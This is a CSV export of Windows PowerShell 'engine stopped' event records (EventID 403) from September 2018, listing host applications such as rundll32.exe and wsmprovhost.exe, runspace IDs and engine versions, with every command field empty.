TimeCreated,Details,EventID
9/6/2018 23:20,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=11020f84-5c63-402f-8eff-299ecdde31d7
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=fd302d68-58aa-47b0-9e5d-e132b6bbd0b0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 19:26,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ac974e29-6dff-45d1-a025-be7b47d54066
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=b13bf80c-a30f-4295-87c8-dc7659c82e2e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 16:58,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ef6cd434-cedc-4962-af75-a7679eac5567
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=ec0f0c1b-9fe9-4adf-8217-00e5ffc4a08b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 15:40,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=be5b2c2e-be18-47bc-81f0-35a1afaf7228
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=437c9179-6d27-4d76-b3bd-98c585ebf496
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 15:09,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=bf64d975-c396-48e4-b9b0-36b1e6b773ea
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=72099b4b-9acf-4cde-af39-f2ec920c98a9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 15:38,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d447fcab-e591-4893-9b5a-fa85294cc14e
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=23aec0c7-256e-4f67-85fd-9c39f894aec5
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
